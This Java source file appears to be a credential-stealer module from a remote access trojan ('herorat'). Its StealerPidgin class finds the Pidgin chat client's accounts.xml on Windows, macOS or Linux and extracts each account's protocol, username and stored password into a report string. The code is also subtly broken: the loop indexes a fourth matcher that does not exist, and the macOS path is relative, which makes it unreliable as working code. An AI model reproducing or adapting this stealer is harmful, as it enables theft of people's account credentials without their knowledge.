package net.herorat.features.stealer;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StealerPidgin
{
	public static String getLogin()
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			String home = System.getProperty("user.home", ".");
			
			File file;
			if (os.contains("win"))
			{
				file = new File(System.getenv("appdata"), ".purple\\accounts.xml");
				if (System.getenv("appdata") == null) file = new File(home, ".purple\\accounts.xml");
			}
			else if (os.contains("mac"))
			{
				file = new File("Library/Application Support/", ".purple/accounts.xml");
			}
			else
			{
				file = new File(home, ".purple/accounts.xml");
			}
			
			if (file.exists())
			{
				StringBuffer buffer_encrypted = new StringBuffer();
				BufferedReader br = new BufferedReader(new FileReader(file));
				String t;
				while((t = br.readLine()) != null) buffer_encrypted.append(t);
	
				Pattern[] pattern = new Pattern[] {
					Pattern.compile("<protocol>\\s*\"?(.*?)</protocol>", 2),
					Pattern.compile("<name>\\s*\"?(.*?)</name>", 2),
					Pattern.compile("<password>\\s*\"?(.*?)</password>", 2),
				};
	
				StringBuffer buffer = new StringBuffer();
				buffer.append("---------- Pidgin -----------\n");
				Matcher[] matcher = new Matcher[] { pattern[0].matcher(buffer_encrypted.toString()), pattern[1].matcher(buffer_encrypted.toString()), pattern[2].matcher(buffer_encrypted.toString()) };
				while ( matcher[0].find() && matcher[1].find() && matcher[2].find() && matcher[3].find() )
				{
					buffer.append("Protocol: " + matcher[0].group(1) + "\n");
					buffer.append("Username: " + matcher[1].group(1) + "\n");
					buffer.append("Password: " + matcher[2].group(1) + "\n");
				}
				buffer.append("-----------------------------\n\n");

				return buffer.toString();
			}
		}
		catch (Exception e) {}
		
		return "";
	}
}